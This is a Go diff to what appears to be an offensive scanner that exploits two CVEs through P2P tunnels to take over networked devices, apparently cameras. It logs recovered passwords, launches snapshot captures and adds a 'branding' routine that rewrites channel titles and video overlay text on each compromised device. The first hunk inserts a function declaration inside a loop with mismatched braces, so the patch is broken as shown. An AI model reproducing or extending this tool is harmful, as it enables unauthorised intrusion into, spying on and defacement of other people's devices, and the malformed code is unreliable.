@@ -166,11 +166,40 @@ func (s *Scanner) Run() {
 					break
 				}
 				if !ok {
-					s.mu.Lock()
-					s.WasteCount++
-					s.CompletedCount++
-					s.mu.Unlock()
-				}
+	s.mu.Lock()
+	s.SafeCount++
+	s.CompletedCount++
+	s.mu.Unlock()
+}
+
+func (s *Scanner) applyBranding(tunnel *p2p.PTCPTunnel, serial string, res *ExploitResult) {
+	if !s.Config.Brand.Enabled || tunnel == nil || res == nil {
+		return
+	}
+
+	replacePlaceholders := func(tmpl string) string {
+		r := strings.ReplaceAll(tmpl, "{serial}", serial)
+		r = strings.ReplaceAll(r, "{model}", res.Model)
+		return r
+	}
+
+	if s.Config.Brand.ChannelTitle != "" {
+		title := replacePlaceholders(s.Config.Brand.ChannelTitle)
+		for ch := 0; ch < res.Channels; ch++ {
+			tunnel.SetChannelTitle(ch, title)
+		}
+	}
+
+	if len(s.Config.Brand.OverlayText) > 0 {
+		lines := make([]string, len(s.Config.Brand.OverlayText))
+		for i, line := range s.Config.Brand.OverlayText {
+			lines[i] = replacePlaceholders(line)
+		}
+		for ch := 0; ch < res.Channels; ch++ {
+			tunnel.SetOverlayText(ch, lines)
+		}
+	}
+}
 			}
 		}()
 	}
@@ -307,11 +336,12 @@ func (s *Scanner) processExploit(serial string, client *p2p.DHClient, tunnel *p2
 			res, err := TryCVE2021_33044(tunnel)
 			if err == nil && res != nil && res.Password != "" {
 				activeTunnel, fresh := reopenVerifiedTunnel(res)
+				res.IP = ip
+				s.handlePwned(serial, res)
+				s.applyBranding(activeTunnel, serial, res)
 				if fresh {
 					go activeTunnel.Disconnect()
 				}
-				res.IP = ip
-				s.handlePwned(serial, res)
 				if !s.launchSnapshot(serial, res) {
 					s.mu.Lock()
 					s.CompletedCount++
@@ -325,11 +355,12 @@ func (s *Scanner) processExploit(serial string, client *p2p.DHClient, tunnel *p2
 			res, err := TryCVE2021_33045(tunnel)
 			if err == nil && res != nil && res.Password != "" {
 				activeTunnel, fresh := reopenVerifiedTunnel(res)
+				res.IP = ip
+				s.handlePwned(serial, res)
+				s.applyBranding(activeTunnel, serial, res)
 				if fresh {
 					go activeTunnel.Disconnect()
 				}
-				res.IP = ip
-				s.handlePwned(serial, res)
 				if !s.launchSnapshot(serial, res) {
 					s.mu.Lock()
 					s.CompletedCount++
@@ -344,6 +375,7 @@ func (s *Scanner) processExploit(serial string, client *p2p.DHClient, tunnel *p2
 			if err == nil && res != nil {
 				res.IP = ip
 				s.handlePwned(serial, res)
+				s.applyBranding(tunnel, serial, res)
 				if !s.launchSnapshot(serial, res) {
 					s.mu.Lock()
 					s.CompletedCount++
@@ -358,6 +390,7 @@ func (s *Scanner) processExploit(serial string, client *p2p.DHClient, tunnel *p2
 			if err == nil && res != nil {
 				res.IP = ip
 				s.handlePwned(serial, res)
+				s.applyBranding(tunnel, serial, res)
 				if !s.launchSnapshot(serial, res) {
 					s.mu.Lock()
 					s.CompletedCount++
@@ -373,6 +406,7 @@ func (s *Scanner) processExploit(serial string, client *p2p.DHClient, tunnel *p2
 		if err == nil && res != nil {
 				res.IP = ip
 				s.handlePwned(serial, res)
+				s.applyBranding(tunnel, serial, res)
 				if !s.launchSnapshot(serial, res) {
 					s.mu.Lock()
 					s.CompletedCount++
